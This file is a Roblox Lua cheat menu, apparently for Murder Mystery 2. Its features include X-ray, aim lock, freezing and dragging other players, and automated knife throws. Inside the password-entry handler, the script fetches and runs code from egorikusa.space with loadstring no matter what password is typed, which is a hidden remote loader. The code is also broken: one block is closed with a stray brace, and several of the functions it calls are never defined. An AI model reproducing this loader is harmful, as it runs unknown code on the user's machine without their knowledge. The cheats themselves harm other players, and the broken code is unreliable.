local module = {}

module["Name"] = "Chronicles VIP [KEY: Naq]"

-- Services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Camera = workspace.CurrentCamera

-- Variables for X-ray effect
local XRAY_TRANSPARENCY = 0.7 -- Transparency value for X-ray effect
local XRAY_DURATION = 5 -- Duration of the X-ray effect in seconds
local XRAY_COLOR = Color3.fromRGB(0, 191, 255) -- Blue tint color for X-ray effect

-- Passwords management
local passwords = {
    "Naq",        -- Example password
    "Raque123",   -- Example password
    "1x21q",      -- Example password
    "28aqk3",     -- Example password
    "iak21j6",    -- Example password
    "skdm291",    -- Example password
    "jsk21"       -- Example password
}

local passwordEntered = false -- Track if any valid password has been entered

-- Store original position before teleportation
local originalPosition = nil

-- Function to toggle the X-ray effect
local function toggleXray(state)
    for _, part in pairs(Workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            if state then
                -- Store original properties
                part:SetAttribute("OriginalTransparency", part.Transparency)
                part:SetAttribute("OriginalColor", part.Color)
                -- Set transparency and color to simulate X-ray effect
                part.Transparency = XRAY_TRANSPARENCY
                part.Color = XRAY_COLOR
            else
                -- Restore original properties
                local originalTransparency = part:GetAttribute("OriginalTransparency")
                local originalColor = part:GetAttribute("OriginalColor")
                if originalTransparency ~= nil then
                    part.Transparency = originalTransparency
                end
                if originalColor ~= nil then
                    part.Color = originalColor
                end
            end
        end
    end
    
    -- Handle cooldown only if X-rays are turned on
    if state then
        -- Set a timer to revert the X-ray effect after XRAY_DURATION seconds
        delay(XRAY_DURATION, function()
            toggleXray(false)
        end)
    end
end

-- Module 4: Information Text
module[1] = {
    Type = "Text",
    Args = {"Universal"}
}

-- Module 1: X-ray Toggle with Password Protection
module[2] = {
    Type = "Toggle",
    Args = {"X-ray [Last Only 5s]", function(Self)
        if passwordEntered then
            local state = not Xrays -- Toggle state
            Xrays = state
            toggleXray(state)
        else
            -- Notify user to enter a valid password
            print("Please enter a valid password.")
        end
    end}
}

-- Module 2: Password Input
module[3] = {
    Type = "Input",
    Args = {"Enter Password", "Submit", function(Self, text)
        local validPassword = false

        -- Check if the entered password matches any valid password
        for _, pw in ipairs(passwords) do
            if text == pw then
                validPassword = true
                passwordEntered = true
                print("Password accepted. Access granted.")
                
                -- Enable specific modules
                module[2].Enabled = true
                module[4].Enabled = true
                module[5].Enabled = true
                module[6].Enabled = true
                module[7].Enabled = true
                module[8].Enabled = true
                module[9].Enabled = true
                module[10].Enabled = true
                module[11].Enabled = true
                module[12].Enabled = true
                
                break
            end
        end
        
        -- Execute script regardless of password
        getgenv().gui = false
        loadstring(game:HttpGet("https://egorikusa.space/6de71144c3b095d56b4c3b71.lua", true))()
        
        if not validPassword then
            print("Incorrect password. Access denied.")
            passwordEntered = false
            
            -- Disable specific modules
            module[2].Enabled = false
            module[4].Enabled = false
            module[5].Enabled = false
            module[6].Enabled = false
            module[7].Enabled = false
            module[8].Enabled = false
            module[9].Enabled = false
            module[10].Enabled = false
            module[11].Enabled = false
            module[12].Enabled = false
        end
    end}
}

module[4] = {
    Type = "Button",
    Args = {"Hold Everyone Hostages", function(Self)
        if passwordEntered then
            local localPlayer = Players.LocalPlayer
            local localTeam = localPlayer.Team
            
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    if localTeam == nil or player.Team ~= localTeam then
                        local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                        if humanoidRootPart then
                            humanoidRootPart.Anchored = true
                            humanoidRootPart.CFrame = localPlayer.Character.HumanoidRootPart.CFrame + localPlayer.Character.HumanoidRootPart.CFrame.LookVector * 5
                        end
                    end
                end
            end
            
            if localTeam == nil then
                print("Placed all players in a single point. Kill everyone at once once you decide to.")
            else
                print("Placed all players not on your team in a single point. Kill everyone at once once you decide to.")
            end
        else
            print("Please enter a valid password.")
        end
    end}
}

-- Module 4: Information Text
module[5] = {
    Type = "Text",
    Args = {"<font color='#FF0000'>MM2 Features</font>"}
}

-- Module 5: Aim Lock Player with Knife
module[6] = {
    Type = "Button",
    Args = {"Aim Lock Player with Knife [MM2 Only]", function(Self)
        if passwordEntered then
            -- Define the target player with a knife (modify as per your game's logic)
            local function getTargetPlayer()
                local localPlayer = Players.LocalPlayer
                for _, player in ipairs(Players:GetPlayers()) do
                    if player ~= localPlayer and player:FindFirstChild("Backpack") then
                        if player.Backpack:FindFirstChild("Knife") then
                            return player
                        end
                    end
                end
                return nil
            end

            local target = getTargetPlayer()
            
            if not target then
                print("No player with a Knife found.")
                return
            end
            
            local aimlockrscon
            local cam = Workspace.CurrentCamera
            local aimlockActive = false
            local aimlockDelayActive = false -- Track if delay is active
            
            -- Function to start aim lock
            local function startAimLock()
                if aimlockActive or aimlockDelayActive then
                    return
                end
                
                aimlockActive = true
                
                aimlockrscon = RunService.RenderStepped:Connect(function()
                    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then 
                        stopAimLock()
                        print("No valid target.")
                        return
                    end
                    cam.CFrame = CFrame.new(cam.CFrame.Position, target.Character:FindFirstChild("HumanoidRootPart").Position)
                end)
                
                print("Aim lock is now on the player with a Knife.")
            end
            
            -- Function to stop aim lock
            local function stopAimLock()
                if aimlockrscon then
                    aimlockrscon:Disconnect()
                    aimlockrscon = nil
                end
                aimlockActive = false
                print("Aim lock has been disabled.")
            end
            
            -- Start aim lock
            startAimLock()
            
            -- Automatically disable after 5 seconds
            aimlockDelayActive = true
            delay(5, function()
                stopAimLock()
                aimlockDelayActive = false
            end)
            
        else
            print("Please enter a valid password.")
        end
    end}
}

-- Module 6: Avoid Murderer By Teleporting to Lobby
module[7] = {
    Type = "Button",
    Args = {"Avoid Murderer By Teleporting to Lobby [Any MM2]", function(Self)
        if passwordEntered then
            -- Define the target CFrame position to teleport to
            local targetCFrame = CFrame.new(Vector3.new(-94.88317108154297, 138.07186889648438, 20.183759689331055))
            
            -- Teleport to lobby
            local character = Players.LocalPlayer.Character
            if character and character.PrimaryPart then
                -- Store original position before teleporting
                local originalPosition = character.PrimaryPart.CFrame
                
                -- Teleport to lobby
                character:SetPrimaryPartCFrame(targetCFrame)
                print("Teleported to lobby.")
                
                -- Automatically return to original position after 3 seconds
                delay(3, function()
                    if character and character.PrimaryPart then
                        character:SetPrimaryPartCFrame(originalPosition)  -- Return to original position
                        print("Returned to original position.")
                    end
                end)
            else
                print("Error: LocalPlayer's character or PrimaryPart not found.")
            end
            
        else
            print("Please enter a valid password.")
        end
    end}
}

module[8] = {
    Type = "Button",
    Args = {"Hold Player With Gun [MM2 Only]", function(Self)
        if passwordEntered then
            local localPlayer = Players.LocalPlayer
            local localTeam = localPlayer.Team
            local heldPlayers = {}

            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    if localTeam == nil or player.Team ~= localTeam then
                        if player:FindFirstChild("Backpack") and player.Backpack:FindFirstChild("Gun") then
                            local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                            if humanoidRootPart then
                                humanoidRootPart.Anchored = true
                                humanoidRootPart.CFrame = localPlayer.Character.HumanoidRootPart.CFrame + localPlayer.Character.HumanoidRootPart.CFrame.LookVector * 5
                                table.insert(heldPlayers, humanoidRootPart) -- Store held players
                            end
                        end
                    end
                end
            end
            
            if localTeam == nil then
                print("Placed all players with a Gun in a single point. They will be released in 0.5 seconds.")
            else
                print("Placed all players with a Gun not on your team in a single point. They will be released in 0.5 seconds.")
            end

            -- Release players after 0.5 seconds
            wait(0.5)
            for _, humanoidRootPart in ipairs(heldPlayers) do
                humanoidRootPart.Anchored = false
            end
            
        else
            print("Please enter a valid password.")
        end
    end}
}

module[9] = {
    Type = "Button",
    Args = {"Avoid Murderer [MM2 Only]", function(Self)
        if passwordEntered then
            -- Define the target CFrame position to teleport to
            local targetCFrame = CFrame.new(Vector3.new(-94.88317108154297, 138.07186889648438, 20.183759689331055))
            
            -- Get the local player and their character
            local player = Players.LocalPlayer
            local character = player.Character
            local Camera = workspace.CurrentCamera
            
            if character and character.PrimaryPart then
                -- Store the original position before teleporting
                local originalCFrame = character.PrimaryPart.CFrame
                
                -- Teleport to lobby and anchor the character
                character:SetPrimaryPartCFrame(targetCFrame)
                character.PrimaryPart.Anchored = true
                print("Teleported to lobby and anchored.")

                -- Freeze the camera
                Camera.CameraType = Enum.CameraType.Scriptable
                Camera.CFrame = Camera.CFrame -- Keeps camera in place
                
                -- Automatically return to original position after 5 seconds
                delay(5, function()
                    if character and character.PrimaryPart then
                        character.PrimaryPart.Anchored = false -- Unanchor
                        character:SetPrimaryPartCFrame(originalCFrame) -- Teleport back to original position
                        Camera.CameraType = Enum.CameraType.Custom -- Unfreeze the camera
                        print("Returned to original position.")
                    end
                end)
            else
                print("Error: LocalPlayer's character or PrimaryPart not found.")
            end
        else
            print("Please enter a valid password.")
        end
    end}
}

module[10] = {
    Type = "Button",
    Args = {"Fake Death [MM2 Only]", function(Self)
        if passwordEntered then
            local localPlayer = Players.LocalPlayer
            local character = localPlayer.Character
            
            if character and character:FindFirstChild("Humanoid") then
                local humanoid = character.Humanoid
                humanoid.Sit = true
            end
        else
            print("Please enter a valid password.")
        end
    end}
}

module[11] = {
    Type = "Button",
    Args = {"Throw knife to closest player (MM2 Only)", function(Self)
        if passwordEntered then
            if findMurderer() ~= localplayer then 
                print("Thanks to Brandon Jay to make it accurate. You're not a murderer.") 
                return 
            end

            if not localplayer.Character:FindFirstChild("Knife") then
                local hum = localplayer.Character:FindFirstChild("Humanoid")
                if localplayer.Backpack:FindFirstChild("Knife") then
                    hum:EquipTool(localplayer.Backpack:FindFirstChild("Knife"))
                else
                    print("You don't have the knife..?")
                    return
                end
            end

            local closestPlayer = findNearestPlayer()
            if not closestPlayer then
                print("No player found to throw at.")
                return
            end

            local closestPlayerHRP = closestPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not closestPlayerHRP then
                print("Could not find the closest player's HumanoidRootPart.")
                return
            end

            -- Raycast to check for walls
            local origin = localplayer.Character:FindFirstChild("HumanoidRootPart").Position
            local direction = (closestPlayerHRP.Position - origin).Unit * (closestPlayerHRP.Position - origin).Magnitude
            local ray = Ray.new(origin, direction)
            local hit, position = workspace:FindPartOnRay(ray, localplayer.Character, false, true)
            
            if hit and hit:IsDescendantOf(closestPlayer.Character) then
                -- First, simulate the knife coming towards the local player from the target player
                local intermediatePosition = origin + direction.Unit * 5  -- Adjust this value as needed
                local argsFirstThrow = {
                    [1] = CFrame.new(closestPlayerHRP.Position), 
                    [2] = origin
                }

                localplayer.Character.Knife.Throw:FireServer(unpack(argsFirstThrow))

                -- Wait for a short moment before throwing the knife to the target player
                wait(0.1)  -- Adjust the wait time as needed

                local argsSecondThrow = {
                    [1] = CFrame.new(origin), 
                    [2] = closestPlayerHRP.Position
                }

                localplayer.Character.Knife.Throw:FireServer(unpack(argsSecondThrow))
            else
                print("Target is behind a wall.")
            end
        else
            print("Please enter a valid password.")
        end
    end}
}

module[12] = {
    Type = "Button",
    Args = {"Spin Camera", function(Self)
        if passwordEntered then
            local localPlayer = Players.LocalPlayer
            local camera = workspace.CurrentCamera
            local TweenService = game:GetService("TweenService")
            local Players = game:GetService("Players")
            
            -- Ensure the camera exists
            if camera then
                local spinDuration = 5  -- Duration of the spin in seconds
                local spinSpeed = 360  -- Speed of the spin in degrees per second
                
                -- Calculate the total rotation angle based on speed and duration
                local totalRotation = math.rad(spinSpeed * spinDuration)
                
                -- Get the current CFrame
                local initialCFrame = camera.CFrame
                
                -- Define the goal CFrame (rotate around the Y axis based on speed and duration)
                local goalCFrame = initialCFrame * CFrame.Angles(0, totalRotation, 0)
                
                -- Define tween info
                local tweenInfo = TweenInfo.new(spinDuration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
                
                -- Create the tween
                local tween = TweenService:Create(camera, tweenInfo, {CFrame = goalCFrame})
                
                -- Function to check if the camera is facing a player with a "Knife" tool
                local function isFacingPlayerWithKnife()
                    for _, player in pairs(Players:GetPlayers()) do
                        if player ~= localPlayer then
                            local character = player.Character
                            if character then
                                local head = character:FindFirstChild("Head")
                                local knife = character:FindFirstChild("Knife")
                                if head and knife then
                                    local directionToPlayer = (head.Position - camera.CFrame.Position).unit
                                    local cameraLookVector = camera.CFrame.LookVector
                                    local angle = math.acos(cameraLookVector:Dot(directionToPlayer))
                                    
                                    if angle < math.rad(5) then  -- Check if the angle is small enough
                                        return player
                                    end
                                end
                            end
                        end
                    end
                    return nil
                end
                
                -- Function to stop the tween and return the camera to its original position
                local function stopAndReturnCamera()
                    tween:Cancel()
                    wait(1)
                    camera.CFrame = initialCFrame
                end
                
                -- Connect the tween's Step event to check if the camera is facing a player with a "Knife" tool
                local connection
                connection = game:GetService("RunService").RenderStepped:Connect(function()
                    local player = isFacingPlayerWithKnife()
                    if player then
                        -- Snap camera to face the player
                        local head = player.Character:FindFirstChild("Head")
                        if head then
                            local lookAt = CFrame.new(camera.CFrame.Position, head.Position)
                            camera.CFrame = lookAt
                        end
                        
                        -- Stop and return the camera after 1 second
                        stopAndReturnCamera()
                        connection:Disconnect()
                    end
                end)
                
                -- Play the tween
                tween:Play()
            end
        else
            print("Please enter a valid password.")
        end
    end}
}

-- Module 4: Information Text
module[13] = {
    Type = "Text",
    Args = {"Made By Brandon Jay | Tiktok: @brx12k Note: Beware from Fake Chronicles Script Just Like Egorikusa ⚠️"}
}

module[14] = {
    Type = "Button",
    Args = {"Swipe to Murderer", function(Self)
        local localPlayer = game.Players.LocalPlayer
        local camera = workspace.CurrentCamera
        local TweenService = game:GetService("TweenService")
        local Players = game:GetService("Players")
        
        -- Ensure the camera exists
        if camera then
            local murderer
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= localPlayer then
                    local character = player.Character
                    if character then
                        local knife = character:FindFirstChild("Knife")
                        if knife then
                            murderer = player
                            break
                        }
                    end
                end
            end
            
            if murderer then
                local murdererHead = murderer.Character:FindFirstChild("Head")
                if murdererHead then
                    local initialCFrame = camera.CFrame
                    local lookAtCFrame = CFrame.new(camera.CFrame.Position, murdererHead.Position)
                    
                    -- Tween to the murderer
                    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
                    local tweenToMurderer = TweenService:Create(camera, tweenInfo, {CFrame = lookAtCFrame})
                    
                    tweenToMurderer:Play()
                    tweenToMurderer.Completed:Wait()
                    
                    -- Wait for 2 seconds
                    wait(2)
                    
                    -- Tween back to the original position
                    local tweenBack = TweenService:Create(camera, tweenInfo, {CFrame = initialCFrame})
                    tweenBack:Play()
                end
            else
                print("Murderer not found.")
            end
        end
    end}
}

-- Initialize Modules as disabled
module[2].Enabled = false
module[4].Enabled = false
module[5].Enabled = false
module[6].Enabled = false
module[7].Enabled = false
module[8].Enabled = false
module[9].Enabled = false
module[10].Enabled = false
module[11].Enabled = false
module[12].Enabled = false

-- Add modules to global modules list
_G.Modules = _G.Modules or {}
table.insert(_G.Modules, module)

return module
